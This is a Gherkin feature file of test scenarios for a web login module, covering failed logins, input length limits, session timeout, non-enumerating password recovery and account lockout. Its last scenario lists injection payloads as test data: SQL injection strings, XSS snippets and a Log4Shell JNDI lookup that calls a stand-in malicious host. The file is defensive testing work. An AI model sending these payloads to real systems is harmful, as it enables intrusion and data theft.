@login_module @regression_v2
Feature: Secure Web Authentication Module
  As a registered user
  I want to securely authenticate with the system
  So that I can access my account and protected resources
  
  Background:
    Given the web application is running
    And the user navigates to the "/login" page
    And the login form is fully loaded in the DOM

  @functional @positive @smoke
  Scenario: Successful login with valid credentials
    Given the user "test_user" has an active, unlocked account
    When the user enters "test_user" into the "Username" input field
    And the user enters "Secur3P@ssw0rd!" into the "Password" input field
    And the user clicks the "Login" submit button
    Then the server should return an HTTP 200 status code
    And the system should set a secure, HttpOnly "session_id" cookie
    And the user should be redirected to the "/dashboard" page

  @functional @negative
  Scenario Outline: Login failures due to invalid or missing credentials
    When the user enters "<username>" into the "Username" input field
    And the user enters "<password>" into the "Password" input field
    And the user clicks the "Login" submit button
    Then the server should return an HTTP 401 status code
    And the UI should display the error message "<error_msg>"
    And no "session_id" cookie should be set in the browser
    And the user should remain on the "/login" page

    Examples:
      | username    | password          | error_msg            |
      | valid_user  | wrong_pass123     | Invalid credentials  |
      | wrong_user  | Secur3P@ssw0rd!   | Invalid credentials  |
      | wrong_user  | wrong_pass123     | Invalid credentials  |
      |             | Secur3P@ssw0rd!   | Username is required |
      | valid_user  |                   | Password is required |
      |             |                   | Fields are required  |

  @functional @boundary
  Scenario Outline: Client-side input validation for field length boundaries
    When the user enters "<username>" into the "Username" input field
    And the user enters "<password>" into the "Password" input field
    And the user clicks the "Login" submit button
    Then the UI should display the validation message "<validation_msg>"
    And the login request should not be sent to the server

    Examples:
      | username                                             | password         | validation_msg                           |
      | ab                                                   | Valid123!        | Username must be at least 3 characters   |
      | toolongusernameexceedingthemaximumfiftycharacters51  | Valid123!        | Username cannot exceed 50 characters     |
      | valid_user                                           | short1!          | Password must be at least 8 characters   |
      | valid_user                                           | aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1! | Password cannot exceed 128 characters |

  @functional @session
  Scenario: Session expiration terminates access after 15 minutes of inactivity
    Given the user is authenticated and active on the "/dashboard" page
    When the user performs no mouse or keyboard interactions for 15 minutes
    And the user attempts to execute a GET request to the secure API endpoint "/api/v1/user/profile"
    Then the server should return an HTTP 401 Unauthorized status code
    And the system should invalidate the "session_id" cookie on the server and client
    And the application should redirect the user to the "/login?reason=timeout" page
    And the UI should display the flash message "Session expired due to inactivity. Please log in again."

  @functional @recovery
  Scenario Outline: Password recovery flow prevents user enumeration
    When the user clicks the "Forgot Password" link
    And the user is redirected to the "/forgot-password" page
    And the user enters "<email_address>" into the "Recovery Email" input field
    And the user clicks the "Send Reset Link" button
    Then the server should return an HTTP 200 status code
    And the UI should display the generic message "If the email is registered, a password reset link has been sent."
    And the system should queue a recovery email to "<email_address>" only if the record exists in the database

    Examples:
      | email_address           |
      | registered@example.com  |
      | non_existent@example.com|

  @security @lockout
  Scenario: Account lockout triggered after 5 consecutive failed attempts
    Given the user "target_user" has an active, unlocked account
    When the user submits an invalid password for "target_user" 4 times consecutively
    And the user submits an invalid password for "target_user" for the 5th time
    Then the server should return an HTTP 403 Forbidden status code
    And the database should update the "target_user" account status to "locked"
    And the database should record the lockout timestamp
    And the UI should display "Account locked due to 5 consecutive failed attempts."
    When the user attempts to log in with the correct password on the 6th attempt
    Then the server should return an HTTP 403 Forbidden status code
    And the UI should display "Account is locked. Please reset your password or try again in 30 minutes."
    And no "session_id" cookie should be set

  @security @injection
  Scenario Outline: System rejects malicious payloads in authentication fields
    When the user enters "<malicious_user>" into the "Username" input field
    And the user enters "<malicious_pass>" into the "Password" input field
    And the user clicks the "Login" submit button
    Then the server should return an HTTP 401 or HTTP 400 status code
    And the application should sanitize or safely escape the input
    And the UI should display the generic error message "Invalid credentials"
    And a security warning should be logged in the centralized SIEM system

    Examples:
      | malicious_user                    | malicious_pass                  |
      | admin' OR '1'='1                  | dummy_pass123!                  |
      | admin" OR 1=1 --                  | dummy_pass123!                  |
      | valid_user                        | ' OR '1'='1                     |
      | <script>alert(document.cookie)    | dummy_pass123!                  |
      | valid_user                        | "><img src=x onerror=alert(1)> |
      | ${jndi:ldap://malicious.com/a}    | dummy_pass123!                  |